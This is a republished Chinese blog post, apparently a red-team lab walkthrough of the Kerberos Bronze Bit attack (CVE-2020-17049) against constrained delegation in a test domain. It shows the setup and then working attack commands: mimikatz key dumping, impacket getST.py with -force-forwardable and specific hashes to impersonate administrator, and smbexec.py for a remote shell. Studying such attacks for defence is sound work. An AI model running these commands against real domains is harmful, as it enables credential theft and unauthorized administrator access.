# Kerberos Bronze Bit Attack(CVE-2020-17049) - aoaoaoao - 博客园

> 原文：[`www.cnblogs.com/websecyw/p/14566644.html`](https://www.cnblogs.com/websecyw/p/14566644.html)

**一、漏洞介绍**

漏洞主要是为了解决：禁止协议转换/协议过渡、受保护的用户和敏感用户不能被委派

**二、约束委派绕过**

server.redteam.com

wsus.redteam.com

设置 server 对 wsus 服务进行委派（用户或计算机选择为 WSUS）

![](img/370b4af8cec03b19e8d2a779b07c7892.png)

设置一个服务账户：setspn -A MSSQLSvc/Service.redteam.com:1433 sql

![](img/5f25e539acf07c479897636729d50f4f.png)

spn 服务账户 sql 设置为“敏感用户不能被委派”或者添加到“受保护的组”中

 ![](img/8a23f1dae3baee54c3bb7d4d09c1db67.png)

尝试常规的约束委派利用，出现报错这是因为“敏感用户不能被委派”和“受保护的组”的原因

 ![](img/ca0c4c5ed1a81ae6a300ee755d0f1238.png)

 尝试 Kerberos Bronze Bit Attack 攻击，攻击需要获取到 server 主机的 hash 与 aeskey

privilege::debug
sekurlsa::ekeys

![](img/45623c33181587ee881d0ef39d06afad.png)

KALI 修改 vim /etc/resolv.conf dns 为域控主机 ip

 python3 getST.py -spn cifs/wsus.redteam.com -impersonate administrator -hashes AAD3B435B51404EEAAD3B435B51404EE(这里是 lmhash 可以任意填写):7f4b4bf82a56f59a5ea4441a71cee4e0 -aesKey 93c99dc00e6ba904751414be3cd99375820cb1bc1d33cdeaf63391f7ccb90456 redteam.com/server -force-forwardable

![](img/5b5b3ea04df815668f7214e17ac33412.png)

 export KRB5CCNAME=administrator.ccache

 python3 smbexec.py -no-pass -k wsus.redteam.com

 ![](img/a526043102af0cce1e2cf7434e52ee8d.png)